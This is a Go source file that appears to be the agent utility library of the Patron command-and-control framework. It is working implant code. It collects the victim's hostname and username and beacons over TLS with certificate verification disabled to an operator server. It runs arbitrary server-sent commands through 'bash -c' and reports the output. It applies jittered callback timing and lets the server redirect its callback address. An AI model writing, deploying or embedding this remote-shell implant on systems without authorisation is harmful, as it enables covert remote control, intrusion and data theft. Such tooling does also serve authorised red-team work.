package agentutils

import (
    "crypto/tls"
    "crypto/x509"
    "encoding/base64"
    "fmt"
    "math/rand"
    "net"
    "os/exec"
    "strconv"
    "strings"
    "time"

    "github.com/google/uuid"
    "github.com/PatronC2/Patron/types"
    "github.com/PatronC2/Patron/lib/logger"
)

// InitLogger initializes the logger.
func InitLogger(enableLogging bool, logFileName string) error {
    logger.EnableLogging(enableLogging)
    err := logger.SetLogFile(logFileName)
    if err != nil {
        return fmt.Errorf("error setting log file: %v", err)
    }
    return nil
}

// SetupTLSConfig sets up the TLS configuration.
func SetupTLSConfig(rootCert string) (*tls.Config, error) {
    publickey, err := base64.StdEncoding.DecodeString(rootCert)
    if err != nil {
        return nil, err
    }

    roots := x509.NewCertPool()
    ok := roots.AppendCertsFromPEM(publickey)
    if !ok {
        return nil, fmt.Errorf("failed to parse root certificate")
    }

    return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

// GetAgentInfo retrieves the agent's UUID, hostname, and username.
func GetAgentInfo() (string, string, string, error) {
    Agentuuid := uuid.New().String()

    hostname, err := exec.Command("hostname", "-f").Output()
    if err != nil {
        hostname = []byte("unknown-host")
    }

    user, err := exec.Command("whoami").Output()
    if err != nil {
        user = []byte("unknown-user")
    }

    return Agentuuid, strings.TrimSpace(string(hostname)), strings.TrimSpace(string(user)), nil
}

// SendBeacon sends the initial beacon to the server.
func SendBeacon(config *tls.Config, serverIP, serverPort, agentUUID, user, hostname, callbackFrequency, callbackJitter string) (*tls.Conn, error) {
    beacon, err := tls.Dial("tcp", serverIP+":"+serverPort, config)
    if err != nil {
        return nil, err
    }

    ipAddress := beacon.LocalAddr().(*net.TCPAddr)
    ip := fmt.Sprintf("%v", ipAddress)
    init := fmt.Sprintf("%s:%s:%s:%s:NoKeysBeacon:%s:%s:%s:%s:MASTERKEY",
        agentUUID, user, hostname, ip, serverIP, serverPort, callbackFrequency, callbackJitter)

    _, err = beacon.Write([]byte(init + "\n"))
    if err != nil {
        return nil, err
    }

    return beacon, nil
}

// HandleCommand processes the command received from the server.
func HandleCommand(instruct *types.GiveAgentCommand, user, hostname, agentUUID string) (*types.GiveServerResult, error) {
    CommandType := instruct.CommandType
    Command := instruct.Command
    CmdOut := ""
    destruct := types.GiveServerResult{}

    switch CommandType {
    case "shell":
        if Command != "" {
            c := exec.Command("bash", "-c", Command)
            buf, err := c.CombinedOutput()
            if err != nil {
                CmdOut = err.Error()
            }
            CmdOut += string(buf)
            destruct = types.GiveServerResult{
                Uuid:        instruct.UpdateAgentConfig.Uuid,
                Result:      "1",
                Output:      CmdOut,
                CommandUUID: instruct.CommandUUID,
            }
        }
    case "update":
        destruct = types.GiveServerResult{
            Uuid:        instruct.UpdateAgentConfig.Uuid,
            Result:      "1",
            Output:      "Success",
            CommandUUID: instruct.CommandUUID,
        }
    case "kill":
        destruct = types.GiveServerResult{
            Uuid:        instruct.UpdateAgentConfig.Uuid,
            Result:      "1",
            Output:      "~Killed~",
            CommandUUID: instruct.CommandUUID,
        }
    default:
        destruct = types.GiveServerResult{
            Uuid:        instruct.UpdateAgentConfig.Uuid,
            Result:      "2",
            Output:      "",
            CommandUUID: instruct.CommandUUID,
        }
    }

    return &destruct, nil
}

// CalculateJitter calculates the beacon time with jitter.
func CalculateJitter(callbackFrequency, callbackJitter string) time.Duration {
    Fre, _ := strconv.Atoi(callbackFrequency)
    Jitt, _ := strconv.Atoi(callbackJitter)
    Jitter := float64(Jitt) * 0.01
    Freq := float64(Fre)
    rand.Seed(time.Now().UnixNano())
    varianceTime := Freq * Jitter * rand.Float64()
    beaconTimeMin := Freq - Jitter*Freq
    beaconTimeRandom := beaconTimeMin + 2*varianceTime

    return time.Second * time.Duration(beaconTimeRandom)
}


// UpdateAgentConfig updates the agent's configuration based on the received instructions.
func UpdateAgentConfig(instruct *types.GiveAgentCommand, ServerIP, ServerPort, CallbackFrequency, CallbackJitter *string) {
    if instruct.UpdateAgentConfig.CallbackTo != "" {
        glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
        *ServerIP = glob[0]
        *ServerPort = glob[1]
    }
    if instruct.UpdateAgentConfig.CallbackFrequency != "" {
        *CallbackFrequency = instruct.UpdateAgentConfig.CallbackFrequency
    }
    if instruct.UpdateAgentConfig.CallbackJitter != "" {
        *CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
    }
}